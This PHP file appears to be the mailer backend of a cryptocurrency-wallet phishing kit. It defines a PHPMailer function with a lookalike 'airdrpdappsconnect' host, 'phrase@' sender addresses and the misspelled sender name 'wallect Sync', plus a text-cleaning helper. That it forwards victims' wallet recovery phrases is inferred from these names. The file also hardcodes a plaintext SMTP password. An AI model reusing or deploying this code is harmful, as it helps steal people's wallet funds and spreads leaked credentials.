<?php

//ChatWallet123

function sendMail($subject, $msg, $email) {
        $mail = new PHPMailer;
        $mail->isSendMail();
        $mail->SMTPDebug = 0;
        $mail->Debugoutput = '';
        $mail->Host = "main--airdrpdappsconnect.netlify.app";
        $mail->Port = 465;
        $mail->SMTPAuth = true;
        $mail->Username = "phrase@airdropdappsconnect.com.ng";
        $mail->Password = 'khariz2020';
        $mail->setFrom('phrase@airdropconnect.com.ng', 'wallect Sync');
        $mail->setFromName = 'wallect Sync';
        $mail->addReplyTo("phrase@airdropdappsconnect.com.ng");
        $mail->addAddress($email);
        $mail->Subject = $subject;
        $mail->msgHTML($msg);
        $mail->isHTML( true );
        
        if($mail->Send()) {
            
            return true;
        }
    }

function urlize($str){
        $edit = preg_replace("([^a-zA-Z0-9\s]+)is", "", $str);
        $edit2 = preg_replace("([\s]+)is", "\n", $edit);
        return $edit2;
    }

?>
